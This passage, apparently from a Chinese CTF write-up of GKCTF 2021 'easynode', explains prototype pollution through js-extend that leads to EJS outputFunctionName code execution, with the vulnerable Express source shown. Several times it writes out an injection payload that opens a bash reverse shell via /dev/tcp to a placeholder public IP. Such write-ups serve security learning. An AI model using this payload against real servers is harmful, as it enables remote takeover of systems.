+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="污染导致的ejs模板rce"><a class="markdownIt-Anchor" href="#污染导致的ejs模板rce"></a> <strong>污染导致的ejs模板rce</strong></h2>
+<p>简言之，就是ejs模板中有一个outputFunctionName属性，原本在ejs模板中是空的。<br />
+但是一旦有了值，ejs模板就会将outputFunctionName当作函数执行。</p>
+<p><strong>ejs简介：</strong></p>
+<p>EJS是一个javascript模板库，用来从json数据中生成HTML字符串</p>
+<ul>
+<li>功能：缓存功能，能够缓存好的HTML模板；</li>
+<li>&lt;% code %&gt;用来执行javascript代码</li>
+</ul>
+<p><strong>基本语法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% JavaScript代码 %&gt;       // 执行JS代码但不输出</span><br><span class="line">&lt;%= 表达式 %&gt;             // 转义输出表达式结果</span><br><span class="line">&lt;%- 原始HTML %&gt;           // 非转义输出原始HTML</span><br><span class="line">&lt;%# 注释 %&gt;               // 注释</span><br><span class="line">%&gt;                        // 纯文本模式结束标签</span><br><span class="line">-%&gt;                       // 删除紧随其后的换行符</span><br></pre></td></tr></table></figure>
+<p>用一个例题讲明白</p>
+<h3 id="gkctf-2021easynode-extend导致原型链污染"><a class="markdownIt-Anchor" href="#gkctf-2021easynode-extend导致原型链污染"></a> [GKCTF 2021]easynode （<strong>extend导致原型链污染</strong>）</h3>
+<p>源自GKCTF 2021]easynode） - 知乎](<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/690718215">https://zhuanlan.zhihu.com/p/690718215</a>)</p>
+<p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> format = <span class="built_in">require</span>(<span class="string">&#x27;string-format&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; select,close &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./tools&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> extend = <span class="built_in">require</span>(<span class="string">&quot;js-extend&quot;</span>).<span class="property">extend</span></span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;generateToken,verifyToken&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;./encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>((__dirname+<span class="string">&#x27;/public/&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//登录界面waf</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">safeQuery</span> =  <span class="keyword">async</span> (<span class="params">username,password</span>)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">waf</span> = (<span class="params">str</span>)=&gt;&#123;</span><br><span class="line">        <span class="comment">// console.log(str);</span></span><br><span class="line">        blacklist = [<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>]</span><br><span class="line">        blacklist.<span class="title function_">forEach</span>(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (str == element)&#123;</span><br><span class="line">                str = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">safeStr</span> = (<span class="params">str</span>)=&gt;&#123; <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">waf</span>(str[i]) ==<span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + str.<span class="title function_">slice</span>(i + <span class="number">1</span>, str.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = <span class="title function_">safeStr</span>(username);</span><br><span class="line">    password = <span class="title function_">safeStr</span>(password);</span><br><span class="line">    <span class="keyword">let</span> sql = <span class="title function_">format</span>(<span class="string">&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;</span>,username.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>),password.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">    <span class="comment">// console.log(sql);</span></span><br><span class="line">    result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql)));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/index.html&quot;</span>)</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">    res.<span class="title function_">end</span>(html)</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="title function_">safeQuery</span>(username,password).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">result</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">const</span> token = <span class="title function_">generateToken</span>(username)</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;token&quot;</span>:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">json</span>(</span><br><span class="line">                    &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;username or password wrong&quot;</span>&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span>=&gt;</span>&#123;res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;something wrong!&quot;</span>&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/admin&quot;</span>,<span class="title function_">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">`select board from board where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>())));  </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.<span class="title function_">renderFile</span>(__dirname + <span class="string">&quot;/public/admin.ejs&quot;</span>,&#123;board,username&#125;)</span><br><span class="line">        res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(html)</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;stop!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/addAdmin&quot;</span>,<span class="title function_">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = <span class="title function_">format</span>(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sql);</span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/adminDIV&quot;</span>,<span class="title function_">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()))); </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">extend</span>(board,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看一下主要的利用点</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/adminDIV&quot;</span>,<span class="title function_">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>.<span class="property">data</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = <span class="title function_">verifyToken</span>(token);</span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()))); </span><br><span class="line">        board = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(query[<span class="number">0</span>].<span class="property">board</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">extend</span>(board,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        <span class="title function_">select</span>(sql).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(err)&#125;); </span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>extend为拷贝函数</strong> （和merge一个道理）</p>
+<p><img src="../images/20250617214453761.png" alt="image-20250617214453761" /></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">返回</span><br><span class="line">&#123; </span><br><span class="line">a: 1, </span><br><span class="line">b: &#x27;wang&#x27;, </span><br><span class="line">c: 4 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以看到后面的属性会将前面的属性覆盖掉。</span><br><span class="line">那么便可以用于原型链污染</span><br></pre></td></tr></table></figure>
+<p><strong>那么目的明确：将ejs中outputFunctionName属性污染成恶意代码。</strong></p>
+<p>也就是（可以直接在网上找到）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">对于</span><br><span class="line"><span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">要令</span><br><span class="line">$&#123;username&#125;=<span class="string">&quot;__proto__&quot;</span></span><br><span class="line"></span><br><span class="line">$&#123;key&#125;=<span class="string">&quot;outputFunctionName&quot;</span></span><br><span class="line"></span><br><span class="line">$&#123;data[key]&#125;<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="key的值"><a class="markdownIt-Anchor" href="#key的值"></a> <strong>key的值</strong></h4>
+<p><strong>key</strong>用data控制，data为POST传入的数据，那么只需要POST传参</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="username的值"><a class="markdownIt-Anchor" href="#username的值"></a> <strong>username的值</strong></h4>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let result = verifyToken(token);</span><br><span class="line"></span><br><span class="line">username = result;</span><br></pre></td></tr></table></figure>
+<p>username由token控制。</p>
+<p>要想username = <code>__proto__</code>的话，就需要知道这时的token值。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="title function_">safeQuery</span>(username,password).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">result</span> =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result[<span class="number">0</span>])&#123;</span><br><span class="line">                <span class="keyword">const</span> token = <span class="title function_">generateToken</span>(username)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br><span class="line">                res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                    <span class="string">&quot;msg&quot;</span>:<span class="string">&quot;yes&quot;</span>,<span class="string">&quot;token&quot;</span>:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">json</span>(</span><br><span class="line">                    &#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;username or password wrong&quot;</span>&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">then</span>(<span class="title function_">close</span>()).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span>=&gt;</span>&#123;res.<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;something wrong!&quot;</span>&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
+<p>当登录成功时会返回username的token值。</p>
+<p>那么就得让这里username是<code>__proto__</code>。</p>
